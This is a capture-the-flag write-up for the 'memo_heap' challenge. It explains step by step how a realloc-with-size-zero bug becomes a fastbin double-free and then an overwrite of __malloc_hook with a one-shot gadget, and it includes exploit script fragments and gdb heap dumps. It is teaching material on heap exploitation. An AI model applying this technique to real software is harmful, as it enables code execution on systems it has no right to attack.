### Overview

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled

***************Menu****************
1 - Create memo
2 - Edit memo
3 - Show memo
4 - Delete memo
5 - Exit
***************Menu****************
```

Menu driven heap pwnable. Let's see what this `memo` is all about. In every memo creation, there is a struct being allocated 
with the following form:

```c
typedef struct _memo {
  /* malloc'd pointer */
  char* name;
  uint32_t namesz;
  uint32_t ref;
}memo;
```

The above struct is allocated on the heap and a pointer to it is returned and stored in a global array of `memo*`. 
Both `edit` and `show` will check if `ref` is still 1 (in every memo allocation the `ref` field is 1) and if yes, they will proceed. 
`show` just prints the `name` field, while `edit` will zero out the `ref` field and then call `realloc(name, namesz)`. 
In other words, we get to have one `edit` for each memo (in theory). Here's `edit`'s code.

```asm
...
; memo*
mov     rax, qword [rbp-0x10]
; memo->ref
mov     eax, dword [rax+0xc]
; --memo->ref
lea     edx, [rax-0x1]
mov     rax, qword [rbp-0x10]
mov     dword [rax+0xc], edx
mov     rax, qword [rbp-0x10]
; memo->namesz
mov     eax, dword [rax+0x8]
movsxd  rdx, eax
mov     rax, qword [rbp-0x10]
; memo->name
mov     rax, qword [rax]
mov     rsi, rdx
mov     rdi, rax
call    realloc
...
```

`delete` will free the name pointer, zero out the `memo->name` field, free the memo pointer and finally zero out the global
array index which corresponded to the deleted memo in order to prevent Use-After-Free.

```asm
...
; memo*
mov     rax, qword [rbp-0x8]
; memo->name
mov     rax, qword [rax]
mov     rdi, rax
call    free
mov     rax, qword [rbp-0x8]
; memo->name = 0
mov     qword [rax], 0x0
mov     rax, qword [rbp-0x8]
mov     rdi, rax
call    free
mov     eax, dword [rbp-0xc]
lea     rdx, [rax*8]
lea     rax, [rel array]
; array[idx] = 0
mov     qword [rdx+rax], 0x0
...
```

Now that we've got a high level idea of what's up, let's dig deeper. I will skip the libc/heap leak part since it's 
just based on malloc theory (how and where it places the free chunks) and on the fact that the binary's custom `read` 
**does not null terminate strings if no new line has been entered**. Feel free to debug the exploit and see it by yourselves, 
I'd like to focus on the juicy/educational bits of this pwnable.

### UAF Outta Nowhere

Although the binary's logic does take care of obvious UAF bugs, it forgot to check on `realloc`'s source code.
When `realloc` gets called, `__libc_realloc` is invoked first internally and there's a really interesting part of its
implementation which we can abuse into triggering UAF.

```c
void *
__libc_realloc (void *oldmem, size_t bytes)
{
  ...

#if REALLOC_ZERO_BYTES_FREES
  if (bytes == 0 && oldmem != NULL)
    {
      __libc_free (oldmem); return 0;
    }
  ...
```

As you can see, if the pointer provided **isn't NULL** and the **requested bytes are 0**, `__libc_realloc` will **free** the
pointer argument and return. Sweet! Since we control both of the arguments, we can call `edit` on a memo whose `namesz` field
is 0 and as a result **free** the name pointer! Now you might be wondering, how can we take advantage of that UAF since we can't 
write to it (namesz is 0)? Well, with a lil' bit of heap wizardry, we can leverage this UAF into a double-free! But first,
let's request some allocations.

```python
alloc(0, '') 	          # memo_0
alloc(0x80, 'A'*8)        # memo_1
alloc(0x68, ' B'*8)       # memo_2
# Craft fake FD pointer
fake_chunk  = p64(0x20)*6
fake_chunk += p64(heap + 0x200)
fake_chunk += p64(0x20) * 9
fake_chunk += p64(0)
alloc(0x88, fake_chunk)   # memo_3
# Take care of next size check
alloc(0x68, p64(0x21)*10) # memo_4
```

Forget about the `fake_chunk` and the comments for now and focus on the allocations. You will understand why I did what I did
shortly.

```
gdb-peda$ x/6gx 0x555555756060 <-- array of memo*
                     [memo_0]            [memo_1]
0x555555756060:	0x00005555557572d0	0x0000555555757030
                     [memo_2]            [memo_3]
0x555555756070:	0x00005555557570e0	0x0000555555757170
                     [memo_4]           
0x555555756080:	0x0000555555757220	0x0000000000000000
```

Time to trigger the UAF.

```python
edit(0, 0, '')
```

```
(0x20)     fastbin[0]: 0x555555757000 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0

gdb-peda$ x/4gx 0x00005555557572d0 - 0x10
0x5555557572c0:	0x0000000000000020	0x0000000000000020 <-- memo_0
0x5555557572d0:	0x0000555555757010	0x0000000000000000 <-- memo->namesz/memo->ref
                         ^
                         |
        memo_0->name - - +
```

Cute, we managed to **free** `memo_0`'s (`0x00005555557572d0`) name pointer (`0x0000555555757010`) without going through the 
`delete` function. What gives? By calling `delete` on a different memo and then on `memo_0`, we can create a double-free scenario!
Let me show you what I mean.

```python
free(1)
```

```
gdb-peda$ x/6gx 0x555555756060
0x555555756060:	0x00005555557572d0	0x0000000000000000
0x555555756070:	0x00005555557570e0	0x0000555555757170
0x555555756080:	0x0000555555757220	0x0000000000000000

(0x20)     fastbin[0]: 0x555555757020 --> 0x555555757000 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0

gdb-peda$ x/4gx 0x0000555555757030 - 0x10
0x555555757020:	0x0000000000000020	0x0000000000000021 <-- memo_1
0x555555757030:	0x0000555555757000	0x0000000100000080
                         ^
                         |                         
        memo_1->name - - +
```

As you can see, `memo_1`'s entry in the array got zero'd out and its name pointer along with itself have been free'd. In case 
you're wondering why I didn't free `memo_0` from the beginning and decided to free `memo_1` first instead, is because of this:

```c
if (__builtin_expect (old == p, 0))
	 malloc_printerr ("double free or corruption (fasttop)");
```

This is part of `_int_free` which checks if the chunk that is about to be free'd is already at the top/head of its corresponding
fastbin list. If it is, bad news for us. Double-free time.

```python
free(0)
```

```
(0x20)     fastbin[0]: 0x5555557572c0 --> 0x555555757000 --> 0x555555757020 --> 0x555555757000
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0

gdb-peda$ x/6gx 0x555555756060
0x555555756060:	0x0000000000000000	0x0000000000000000
0x555555756070:	0x00005555557570e0	0x0000555555757170
0x555555756080:	0x0000555555757220	0x0000000000000000
```

Look at this beauty! `0x555555757000` is **twice** in the fastbin list! Meaning, if we request a memo name of size less than or equal to **0x18**
(which will get aligned to 0x20), we will get back `0x555555757000` as our new name pointer (`0x5555557572c0` will be the address
of the new memo) and therefore we will be able to tamper with `0x555555757000`'s forward pointer since it will still be on 
the free list. If you're not familiar with how a fastbin attack works, have a look at [this](https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c). 

Now, usually the classic way to move on from there is to overwrite the forward pointer of `0x555555757000` with an address
close to `__malloc_hook` or, `__realloc_hook`, or `__free_hook`, then trigger `malloc` enough times so that it returns one of
the latter and finally overwrite it with `one shot gadget`. That scenario is usually feasible for chunk allocations of size 
either `0x60` or `0x68`. Since the only way to trigger the UAF was via `0x20` sizes , we can't do that (at least I couldn't). 
Or can we? ;)

### Exploitation Analysis

Even though we can't directly overwrite one of the hooks, I set out a goal to make it happen. What if we use the fastbin attack
to make `malloc` return a chunk close to an already in use chunk so that we free the latter and then overwrite its size with **0x71**?
Pay close attention to the following allocation.

```python
alloc(0x8, p64(heap + 0x1b0))
```

```
(0x20)     fastbin[0]: 0x555555757020 --> 0x555555757000 --> 0x5555557571b0 --> 0x555555757200 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0

```

This allocation effectively tampers with `0x555555757000`'s FD pointer by making it point to `heap + 0x1b0`. Note that this is
an arbitrary choice, I picked this certain address because of the heap's state at the current stage of my exploit. My target victim
was `memo_4`. You'll see why really soon. First of all, even though `0x5555557571b0` was the aimed FD pointer goal, the fastbin list
got extended and `0x555555757200` popped outta nowhere. That's no coincidence.

```
0x5555557571b0:	0x0000000000000020	0x0000000000000020 <-- fake free x
0x5555557571c0:	0x0000555555757200	0x0000000000000020
0x5555557571d0:	0x0000000000000020	0x0000000000000020
0x5555557571e0:	0x0000000000000020	0x0000000000000020
0x5555557571f0:	0x0000000000000020	0x0000000000000020
0x555555757200:	0x0000000000000020	0x0000000000000020 <--fake free y
0x555555757210:	0x0000000000000000	0x0000000000000021 <-- memo_4
0x555555757220:	0x0000555555757240	0x0000000100000068
```

Practically, we tricked malloc into thinking that there are two more chunks(`x` and `y`) of size `0x20` ready to be served back to the user.
Now it's the time to look back at the `fake_chunk` I told you to forget about. 

```python
# Craft fake FD pointer
fake_chunk  = p64(0x20)*6
fake_chunk += p64(heap + 0x200)
fake_chunk += p64(0x20) * 9
fake_chunk += p64(0)
alloc(0x88, fake_chunk)
```

There is a slight spam of `p64(0x20)`. Well, we can't just overwrite the forward pointer of `0x555555757200` with a random address. 
We need to make sure the chunk is looking legit. Meaning, if the chunk's size doesn't match with the rest of the fastbin list's
size (`0x20` in our case), `_int_malloc` won't be happy.

```c
...
/* Check if the new chunk's size does belong to the fastbin list's size */
size_t victim_idx = fastbin_index (chunksize (victim));
if (__builtin_expect (victim_idx != idx, 0))
		malloc_printerr ("malloc(): memory corruption (fast)");
...
```

Both `0x5555557571b0` and `0x555555757200` are of size `0x20` so we're good to go. Why fake two chunks and not just one you may ask. 
That's because the first allocation is by default of size `0x20` and is used to fill in the new memo's fields. We don't have
much control over that one. However, we do have control over the allocated area with the second allocation which is for the 
`name` pointer. Next allocation, as long as between `0x0` and `0x18`, it will return `0x555555757020` and `0x555555757000`.

```python
alloc(0x18, 'lel')
```

```
(0x20)     fastbin[0]: 0x5555557571b0 --> 0x555555757200 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0

0x5555557571b0:	0x0000000000000020	0x0000000000000020 <-- fake free x
0x5555557571c0:	0x0000555555757200	0x0000000000000020
0x5555557571d0:	0x0000000000000020	0x0000000000000020
0x5555557571e0:	0x0000000000000020	0x0000000000000020
0x5555557571f0:	0x0000000000000020	0x0000000000000020
0x555555757200:	0x0000000000000020	0x0000000000000020 <-- fake free y
0x555555757210:	0x0000000000000000	0x0000000000000021 <-- memo_4
0x555555757220:	0x0000555555757240	0x0000000100000068
```

It's chunk's `x` and `y` turn. We will overflow `memo_4`'s size and make it `0x71`.

```python
alloc(0x18, p64(0) + p64(0x71) + p64(0))
```

```
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0

0x5555557571b0:	0x0000000000000020	0x0000000000000020 <-- x
0x5555557571c0:	0x0000555555757210	0x0000000100000018
0x5555557571d0:	0x0000000000000020	0x0000000000000020
0x5555557571e0:	0x0000000000000020	0x0000000000000020
0x5555557571f0:	0x0000000000000020	0x0000000000000020
0x555555757200:	0x0000000000000020	0x0000000000000020 <-- x->name
0x555555757210:	0x0000000000000000	0x0000000000000071 <-- memo_4
0x555555757220:	0x0000000000000000	0x0000000100000068
0x555555757230:	0x0000000000000000	0x0000000000000071
0x555555757240:	0x0000000000000021	0x0000000000000021
0x555555757250:	0x0000000000000021	0x0000000000000021
0x555555757260:	0x0000000000000021	0x0000000000000021
0x555555757270:	0x0000000000000021	0x0000000000000021
0x555555757280:	0x0000000000000021	0x0000000000000021
```

We successfully overwrote `memo_4`'s size with **0x71**. Before we free it, we need to make sure the following `_int_free` checks
are bypassed.

```c
if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))
			  <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
```

The above checks make sure that the chunk next to the one currently being free'd (`0x555555757210 + 0x78`) is of reasonable size (greater than or equal to 
`0x20` and less than or equal to `system_mem`). 

```python
free(4)
```

```
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x555555757210 --> 0x0
(0x80)     fastbin[6]: 0x0

0x5555557571b0:	0x0000000000000020	0x0000000000000020 <-- x
0x5555557571c0:	0x0000555555757210	0x0000000100000018
0x5555557571d0:	0x0000000000000020	0x0000000000000020
0x5555557571e0:	0x0000000000000020	0x0000000000000020
0x5555557571f0:	0x0000000000000020	0x0000000000000020
0x555555757200:	0x0000000000000020	0x0000000000000020 <-- x->name
0x555555757210:	0x0000000000000000	0x0000000000000071 <-- memo_4
0x555555757220:	0x0000000000000000	0x0000000100000068
```

Now if we call `edit` on chunk `x`, we will be able to overwrite `memo_4`'s FD pointer with an area close to `__malloc_hook`.
But, not so easy. `_int_realloc` uses the same checks as `_int_free` when it's called.

```c
  if (__builtin_expect (chunksize_nomask (next) <= 2 * SIZE_SZ, 0)
      || __builtin_expect (nextsize >= av->system_mem, 0))
    malloc_printerr ("realloc(): invalid next size");
```

`nextsize` of `x->name` would be `0x555555757200 + 0x20 == 0x0000000100000068` with current `system_mem` being `0x21000`. This is
definitely much bigger than the allowed size. That being said, we need to re-request `memo_4` back and change `0x0000000100000068`
to a logical number. 

```python
alloc(0x68, p64(0x21)*2)
```

```
0x5555557571b0:	0x0000000000000020	0x0000000000000020 <-- x
0x5555557571c0:	0x0000555555757210	0x0000000100000018
0x5555557571d0:	0x0000000000000020	0x0000000000000020
0x5555557571e0:	0x0000000000000020	0x0000000000000020
0x5555557571f0:	0x0000000000000020	0x0000000000000020
0x555555757200:	0x0000000000000020	0x0000000000000020 <-- x->name
0x555555757210:	0x0000000000000000	0x0000000000000071 <-- memo_4
0x555555757220:	0x0000000000000021	0x0000000000000021
```

Now that this has been taken care of, we can free `memo_4` again and finally edit `x->name`.

```python
free(4)
# Fastbin attack - overwrite victim's FD
edit(5, 0x18, p64(0) + p64(0x71) + p64(mhook - 0x30 + 0xd))
```

```
(0x20)     fastbin[0]: 0x5555557572a0 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x555555757210 --> 0x7ffff7dd1aed 
(0x80)     fastbin[6]: 0x0


0x5555557571b0:	0x0000000000000020	0x0000000000000020 <-- x
0x5555557571c0:	0x0000555555757210	0x0000000000000018
0x5555557571d0:	0x0000000000000020	0x0000000000000020
0x5555557571e0:	0x0000000000000020	0x0000000000000020
0x5555557571f0:	0x0000000000000020	0x0000000000000020
0x555555757200:	0x0000000000000020	0x0000000000000020 <-- x->name
0x555555757210:	0x0000000000000000	0x0000000000000071 <-- memo_4 
0x555555757220:	0x00007ffff7dd1aed	0x0000000000000021

gdb-peda$ x/4gx 0x7ffff7dd1aed
0x7ffff7dd1aed:	0xfff7dd0260000000	0x000000000000007f <-- valid size
0x7ffff7dd1afd:	0xfff7a92e20000000	0x000000000000007f
```

We successfully managed to overwrite `memo_4`'s FD pointer with `0x7ffff7dd1aed`, which is an address quite close to `__malloc_hook`.
The next two name allocations, as long as they are of size `0x68` or `0x60` will return `0x555555757210` and `0x00007ffff7dd1aed`.
Finally, all we have to do is overwrite `__malloc_hook`'s address with `one shot gadget`'s and trigger the final and lethal
allocation.

```python
# Return 0x555555757210
alloc(0x68, 'rekt')
```

```
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x7ffff7dd1aed
(0x80)     fastbin[6]: 0x0

gdb-peda$ x/gx &__malloc_hook
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000
```

```python
# __malloc_hook => one shot gadget
alloc(0x68, 'A'*0x13+p64(oneshot))
# Trigger one shot gadget
r.sendline('1')
```

```
gdb-peda$ x/gx &__malloc_hook
0x7ffff7dd1b10 <__malloc_hook>:	0x00007ffff7afe147 <-- one shot gadget
```

Et voilà.

```
[+] Opening connection to memoheap.acebear.site on port 3003: Done
[+] Libc:          0x7f2354da6000
[+] __malloc_hook: 0x7f235516ab10
[+] Heap:          0x558b2c91c000
[*] Switching to interactive mode
Done!
***************Menu****************
1 - Create memo
2 - Edit memo
3 - Show memo
4 - Delete memo
5 - Exit
***************Menu****************
Your choice:
$ cat home/memo_heap/flag
AceBear{w4iting_h4rd3r_ch4ll3ng3_fr0m_m3}
```
